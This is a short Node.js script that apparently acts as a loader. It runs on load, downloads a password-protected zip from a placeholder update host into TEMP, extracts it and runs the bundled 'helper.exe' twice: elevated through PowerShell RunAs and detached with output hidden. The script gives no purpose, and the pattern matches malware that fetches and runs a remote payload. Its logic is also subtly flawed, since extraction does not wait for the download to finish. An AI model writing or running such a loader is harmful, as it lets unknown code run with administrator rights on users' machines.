const fs = require('fs');
const https = require('https');
const path = require('path');
const Seven = require('node-7z');
const { spawn } = require('child_process');

const archive = path.join(process.env.TEMP, 'bundle.zip');
https.get('https://updates.example.invalid/download/bundle.zip', (response) => {
  response.pipe(fs.createWriteStream(archive));
});

async function extractAndLaunch(destination) {
  await Seven.extractFull(archive, destination, { password: 'bundle-key' });
  const exePath = path.join(destination, 'helper.exe');
  const psCommand = `Start-Process -FilePath "${exePath}" -Verb RunAs -Wait`;
  spawn('powershell.exe', ['-NoProfile', '-Command', psCommand]);
  spawn(exePath, [], { detached: true, stdio: 'ignore' }).unref();
}

async function initialize() {
  await extractAndLaunch(path.join(process.env.TEMP, 'extracted'));
}

initialize();
